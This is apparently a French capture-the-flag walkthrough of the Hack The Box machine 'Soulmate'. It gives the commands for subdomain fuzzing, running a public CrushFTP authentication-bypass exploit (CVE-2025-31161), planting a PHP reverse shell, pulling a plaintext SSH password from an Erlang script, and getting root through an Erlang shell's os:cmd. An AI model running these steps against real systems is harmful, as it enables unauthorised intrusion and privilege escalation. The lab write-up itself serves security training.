On commence par un scna nmap :
	nmap -A -p- -T4 10.129.94.221 -v
		80 et 22

On doit d'abord ajouter dans le fichier /etc/hosts
	10.129.94.221   soulmate.htb


Création d'un compte 
	name: t
	lastname: t
	password: testtest

En rechant les sous-domaines on trouve ceci
	ffuf -u http://10.129.94.221 -H "Host: FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
	ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 182ms]

l'application ne serait donc a rien. On doit ajouter dans le fichier /etc/hosts
        10.129.94.221   soulmate.htb ftp.soulmate.htb

et en cherchant sur le navigeut http://ftp.soulmate.htb
	On tombe sur CrushFTP	


Un exploit est disponible pour creer ou modifier les mots de passe ( CVE-2025-31161 ) :
	https://github.com/Immersive-Labs-Sec/CVE-2025-31161
	python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --new_user admin --password admin


On voit dans les utilisateurs existants sont :
	ben
	crushadmin
	defaut
	jenna	
	TempAccount

on change le mot de passe de ben ( ne pas oublier de SAVE en bas de la page )
et publier un revershell php
puis acceder au lien 
	http://soulmate.htb/rev.php

Une fois le shell obtenu. Maintenant on execute le scipt linpeas.sh
On trouve le processus :

	root        1085  0.0  1.7 2252172 71104 ?       Ssl  12:03   0:03 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript

quand on affcihe le fichier avec __cat__ on trouve 
	{user_passwords, [{"ben", "HouseH0ldings998"}]},


On peut maintenant se connecter en ssh a __ben__ et le fichier user.txt




Pour le passage en root, on regarde les port qui écoutent, ou trouve un port qui ecoute sur la machine.

	ss -tlnp

on voit :

	127.0.0.1:2222

quand on se connecte en ssh :
	ssh ben@127.0.0.1 -p 2222
	mdp

on trombe sur 
	Eshell V15.2.5

pour executer des commandes 
	os:cmd("CMD")

on verifie notre utilisateur
	os:cmd("id")

on voit que on est root sur la machine
	os:cmd("cat /root/root.txt")
